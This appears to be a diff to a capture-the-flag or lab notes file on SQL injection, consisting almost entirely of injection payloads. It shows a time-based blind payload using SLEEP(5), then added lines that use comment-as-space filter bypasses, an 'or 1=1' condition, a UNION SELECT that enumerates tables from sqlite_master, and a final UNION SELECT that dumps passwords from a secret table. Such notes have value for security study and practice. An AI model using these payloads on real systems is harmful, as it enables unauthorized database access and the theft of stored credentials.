@@ -26,3 +26,11 @@ If you're struggling to find the table name, the below query should help you on 
 
   
 `referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--`
+
+
+
+score=0'&ineq=a
+score=95&ineq=<>?--a
+score=100&ineq=>?/**/or/**/1=1--a
+score=100&ineq=>?/**/union/**/select/**/name,/**/sql,/**/0,/**/name/**/from/**/sqlite_master--a
+score=100&ineq=>?/**/union/**/select/**/password,/**/password,/**/userid,/**/password/**/from/**/s3ekr17_passwords/**/order/**/by/**/userid--x
